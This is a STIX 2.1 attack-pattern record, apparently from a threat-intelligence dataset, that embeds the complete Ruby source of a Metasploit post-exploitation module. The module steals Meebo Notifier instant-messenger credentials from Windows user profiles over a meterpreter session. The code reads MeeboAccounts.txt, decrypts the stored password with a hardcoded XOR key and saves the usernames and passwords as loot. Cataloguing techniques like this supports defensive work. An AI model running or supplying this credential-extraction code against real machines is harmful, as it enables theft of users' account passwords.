{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8642ec9-5da1-45c5-9d2d-bfb2764134c1",
    "created": "2024-08-14T16:33:08.240366Z",
    "modified": "2024-08-14T16:33:08.24037Z",
    "name": "Windows Gather Meebo Password Extractor",
    "description": " This module extracts login account password stored by Meebo Notifier, a desktop version of Meebo's Online Messenger.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/meebo.rb",
            "external_id": "meebo.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Meebo Password Extractor',\n        'Description' => %q{\n          This module extracts login account password stored by\n          Meebo Notifier, a desktop version of Meebo's Online Messenger.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',\n          'Unknown', # SecurityXploded Team, www.SecurityXploded.com\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    grab_user_profiles.each do |user|\n      accounts = user['AppData'] + '\\\\Meebo\\\\MeeboAccounts.txt'\n      next if user['AppData'].nil?\n      next if accounts.empty?\n\n      stat = begin\n        session.fs.file.stat(accounts)\n      rescue StandardError\n        nil\n      end\n      next if stat.nil?\n\n      parse_txt(accounts)\n    end\n  end\n\n  def parse_txt(file)\n    creds = Rex::Text::Table.new(\n      'Header' => 'Meebo Instant Messenger Credentials',\n      'Indent'\t=> 1,\n      'Columns' =>\n      [\n        'User',\n        'Password',\n        'Protocol'\n      ]\n    )\n\n    config = client.fs.file.new(file, 'r')\n    parse = config.read\n\n    if (parse =~ /\"password.{5}(.*)\",\\s*\"protocol.{4}(\\d),\\s*\"username.{5}(.*)\"/)\n      epass = ::Regexp.last_match(1)\n      protocol = ::Regexp.last_match(2).to_i\n      username = ::Regexp.last_match(3)\n    else\n      print_error('Regex failed...')\n      return\n    end\n\n    protocol = 'Meebo' if protocol == 0\n    protocol = 'AIM' if protocol == 1\n    protocol = 'Yahoo IM' if protocol == 2\n    protocol = 'Windows Live' if protocol == 3\n    protocol = 'Google Talk' if protocol == 4\n    protocol = 'ICQ' if protocol == 5\n    protocol = 'Jabber' if protocol == 6\n    protocol = 'Myspace IM' if protocol == 7\n\n    passwd = decrypt(epass)\n    print_good(\"*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***\")\n    creds << [username, passwd, protocol]\n    config.close\n\n    if passwd.nil? || username.nil?\n      print_status('Meebo credentials have not been found')\n    else\n      print_status('Storing data...')\n      path = store_loot(\n        'meebo.user.creds',\n        'text/csv',\n        session,\n        creds.to_csv,\n        'meebo_user_creds.csv',\n        'Meebo Notifier User Credentials'\n      )\n      print_good(\"Meebo Notifier user credentials saved in: #{path}\")\n    end\n  rescue ::Exception => e\n    print_error(\"An error has occurred: #{e}\")\n  end\n\n  def decrypt(epass)\n    magicarr = [\n      4, 240, 122, 53, 65, 19, 163, 124, 109,\n      73, 187, 3, 34, 93, 15, 138, 11, 153, 148, 147, 146,\n      222, 129, 160, 199, 104, 240, 43, 89, 105, 204, 236,\n      253, 168, 96, 48, 158, 143, 173, 60, 215, 104, 112,\n      149, 15, 114, 107, 4, 92, 149, 48, 177, 42, 133, 124,\n      152, 63, 137, 2, 40, 84, 131\n    ]\n\n    plaintext = [epass].pack('H*').unpack('C*')\n\n    for i in 0..plaintext.length - 1 do\n      plaintext[i] ^= magicarr[i]\n    end\n\n    return plaintext.pack('C*')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}